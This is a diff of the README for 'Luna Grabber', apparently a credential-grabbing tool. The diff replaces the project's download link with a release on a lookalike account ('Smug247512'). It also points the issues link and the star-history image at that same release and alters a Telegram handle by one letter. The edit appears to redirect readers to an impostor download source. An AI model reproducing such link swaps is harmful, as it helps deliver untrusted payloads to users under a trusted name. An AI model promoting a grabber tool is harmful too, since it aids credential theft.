@@ -17,7 +17,7 @@
   <img  src="https://img.shields.io/github/issues-closed/Smug246/Luna-Grabber?color=6d00c1&logoColor=6d00c1">
   <br>
   <p align="center">
-  Telegram: https://t.me/lunaxsmug
+  Telegram: https://t.me/lunaxsmu
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 </p>
 </div>
@@ -86,7 +86,7 @@
 ```
 Make sure you have Python 3.11+ installed and it is added to your path.
 ```
-### 2. [Download](https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip) The Files:
+### 2. [Download](https://github.com/Smug247512/Luna-Grabber/releases/tag/luna-grabber) The Files:
 
 ```
 Once you've downloaded the files extract the folder so it's no longer a .zip file.
@@ -145,7 +145,7 @@ Don't forget to give the project a star! Thanks again!
 5. Open a Pull Request
 
 ## Errors
-If you find an error that you cant fix and need help with you can submit an [issue](https://github.com/Smug246/Luna-Grabber/issues/) or join the [telegram](https://t.me/lunaxsmug) for support
+If you find an error that you cant fix and need help with you can submit an [issue](https://github.com/Smug247512/Luna-Grabber/releases/tag/luna-grabber) or join the [telegram](https://t.me/lunaxsmug) for support
 
 
 ## License
@@ -154,4 +154,4 @@ Luna Grabber is distributed under the MIT License. See `LICENSE.md` for more inf
 
 ## Star Graph
 
-![Star History Chart](https://api.star-history.com/svg?repos=Smug246/Luna-Grabber&type=Date)
+![Star History Chart](https://github.com/Smug247512/Luna-Grabber/releases/tag/luna-grabber)
